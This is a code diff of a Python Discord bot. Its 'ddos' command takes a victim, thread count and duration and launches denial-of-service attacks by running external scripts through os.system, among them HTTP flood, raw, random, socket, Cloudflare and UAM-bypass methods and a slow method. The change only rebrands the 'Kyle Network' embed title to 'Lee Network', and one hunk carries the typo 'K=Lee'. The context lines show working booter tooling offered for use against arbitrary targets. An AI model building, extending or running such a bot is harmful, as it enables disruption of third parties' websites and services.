@@ -136,7 +136,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                 else:
                     thread2 = int(thread)
                 if method == 'HTTP-FLOOD':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -146,7 +146,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
                 elif method == 'HTTP-RAW':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -156,7 +156,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'node HTTP-RAW.js {victim} {time2}')
                 elif method == 'HTTP-RAND':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -166,7 +166,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'node HTTP-RAND.js {victim} {time2}')
                 elif method == 'HTTP-SOCKET':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"K=Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -176,7 +176,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
                 elif method == 'CLOUDFLARE':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -186,7 +186,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'node cf.js {victim} {time2} {thread2}')
                 elif method == 'UAM-BYPASS':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
@@ -196,7 +196,7 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     await ctx.send(embed=embed)
                     system(f'node uambypass.js {victim} {time2} 2000 http.txt')
                 elif method == 'SLOW':
-                    embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/loading.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
